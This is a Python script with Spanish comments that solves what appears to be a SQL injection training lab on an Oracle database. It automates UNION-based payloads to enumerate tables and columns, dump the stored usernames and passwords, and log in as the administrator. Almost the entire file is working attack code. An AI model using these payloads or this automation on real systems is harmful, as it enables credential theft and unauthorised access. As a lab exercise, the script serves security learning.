# Lab: SQL injection attack, listing the database contents on Oracle 
# PRACTITIONER

# This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
# The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
# To solve the lab, log in as the `administrator` user.

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

#variables globales
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxyjp = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
nombre_parametro = "algo"
ruta = f"filter?category={nombre_parametro}"

def Obtener_motor_o_version_bd_función(url):
    payload_motor_bd_función = "' UNION SELECT banner, NULL FROM v$version--"
    solicitud_motor_bd_función = requests.get(url + ruta + payload_motor_bd_función, verify=False, proxies=proxyjp)
    respuesta_motor_bd_función = solicitud_motor_bd_función.text
    if "Oracle Database" in respuesta_motor_bd_función:
        parseado_motor_bd_función = BeautifulSoup(respuesta_motor_bd_función, 'html.parser')
        motor_bd_función = parseado_motor_bd_función.find(string=re.compile('.*Express Edition.*'))
        return motor_bd_función
    return None

def Obtener_tablas_de_oracle_función(url):
    payload_obtener_tablas_oracle = "' UNION SELECT table_name,NULL FROM all_tables--"
    solicitud_obtener_tablas_oracle = requests.get(url + ruta + payload_obtener_tablas_oracle, verify=False, proxies=proxyjp)
    respuesta_obtener_tablas_oracle = solicitud_obtener_tablas_oracle.text
    if "USERS_" in respuesta_obtener_tablas_oracle:
        parseado_obtener_tablas_oracle = BeautifulSoup(respuesta_obtener_tablas_oracle,'html.parser')
        tablas_de_oracle = parseado_obtener_tablas_oracle.find(string=re.compile('^USERS_.*'))
        return tablas_de_oracle
    return None

def Obtener_columnas_usuario_de_oracle_función(url):
    tabla_objetivo = Obtener_tablas_de_oracle_función(url)
    payload_obtener_columnas_oracle = f"' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = '{tabla_objetivo}'--"
    solicitud_obtener_columnas_oracle = requests.get(url + ruta + payload_obtener_columnas_oracle, verify=False, proxies=proxyjp)
    respuesta_obtener_columnas_oracle = solicitud_obtener_columnas_oracle.text
    if "PASSWORD_" in respuesta_obtener_columnas_oracle:
        parseado_obtener_columnas_oracle = BeautifulSoup(respuesta_obtener_columnas_oracle,'html.parser')
        columna_usuario_de_la_tabla_objetivo = parseado_obtener_columnas_oracle.find(string=re.compile('^USERNAME_.*'))
        return columna_usuario_de_la_tabla_objetivo
    return None

def Obtener_columnas_password_de_oracle_función(url):
    tabla_objetivo = Obtener_tablas_de_oracle_función(url)
    payload_obtener_columnas_oracle = f"' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = '{tabla_objetivo}'--"
    solicitud_obtener_columnas_oracle = requests.get(url + ruta + payload_obtener_columnas_oracle, verify=False, proxies=proxyjp)
    respuesta_obtener_columnas_oracle = solicitud_obtener_columnas_oracle.text
    if "PASSWORD_" in respuesta_obtener_columnas_oracle:
        parseado_obtener_columnas_oracle = BeautifulSoup(respuesta_obtener_columnas_oracle,'html.parser')
        columna_password_de_la_tabla_objetivo = parseado_obtener_columnas_oracle.find(string=re.compile('^PASSWORD_.*'))
        return columna_password_de_la_tabla_objetivo
    return None


def Obtener_credenciales_de_oracle_función(url):
    columna_usuario = Obtener_columnas_usuario_de_oracle_función(url)
    columna_password = Obtener_columnas_password_de_oracle_función(url)
    tabla_objetivo = Obtener_tablas_de_oracle_función(url)
    payload_obtener_credenciales_oracle = f"' UNION SELECT {columna_usuario}, {columna_password} FROM {tabla_objetivo}--"
    solicitud_obtener_credenciales_oracle = requests.get(url + ruta + payload_obtener_credenciales_oracle, verify=False, proxies=proxyjp)
    respuesta_obtener_credenciales_oracle = solicitud_obtener_credenciales_oracle.text
    parseado_obtener_credenciales_oracle = BeautifulSoup(respuesta_obtener_credenciales_oracle,'html.parser')
    enocntrando_trs = parseado_obtener_credenciales_oracle.find_all('tr')
    for tr in enocntrando_trs:
        encontrando_ths = tr.find('th')
        if encontrando_ths and encontrando_ths.get_text().strip() == "administrator":
            encontrando_tds = tr.find('td')
            if encontrando_tds and encontrando_tds.get_text().strip():
                return encontrando_tds.get_text().strip() 
    return None

def Obtener_token_csrf_función(sessión, url):
    carga_pagina_login = sessión_actual.get(url + "login", verify=False, proxies=proxyjp)
    parseado_carga_pagina_login = BeautifulSoup(carga_pagina_login.text,'html.parser')
    obteniendo_fila_csrf = parseado_carga_pagina_login.find("input",{"name":"csrf"})
    if obteniendo_fila_csrf:
        csrf = obteniendo_fila_csrf['value']
        return csrf
    else:
        print("[-] No se encontro token CSRF.")
        return None

def inicio_de_sesión(sessión, url):
    contraseña_obtenida = Obtener_credenciales_de_oracle_función(url)
    token_csrf = Obtener_token_csrf_función(sessión_actual, url)
    #print("[+] El token en el login es: " + token_csrf)
    credenciales_token = {"csrf": token_csrf,
            "username": "administrator",
            "password": contraseña_obtenida}
    logueando = sessión.post(url + "login", data=credenciales_token, verify=False, proxies=proxyjp)
    respuesta_logueado = logueando.text
    if "Log out" in respuesta_logueado:
        print("[+] Inicio de sesión existoso!!!")
    else:
        print("[-] Inicio de sesión Fallido.")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        version = Obtener_motor_o_version_bd_función(url)
        print("[+] El motor y version de bd es: " + version)
        tabla_objetivo = Obtener_tablas_de_oracle_función(url)
        print("[+] La tabla objetivo es: " + tabla_objetivo)
        columna_usuario = Obtener_columnas_usuario_de_oracle_función(url)
        print("[+] La columna usuario es: " + columna_usuario)
        columna_password = Obtener_columnas_password_de_oracle_función(url)
        print("[+] La columna usuario es: " + columna_password)
        contraseña_obtenida = Obtener_credenciales_de_oracle_función(url)
        print("[+] La contraseña del usuario administrator es: " + contraseña_obtenida)
        sessión_actual = requests.Session()
        token_csrf = Obtener_token_csrf_función(sessión_actual, url)
        print("[+] el token CSRF es: " + token_csrf)
        inicio_de_sesión(sessión_actual,url)
    except IndexError:
        print("[-] Uso: %s <url>" % sys.argv[0])
        print("[-] Ejemplo: %s <url>" % sys.argv[0])
        sys.exit(-1)
        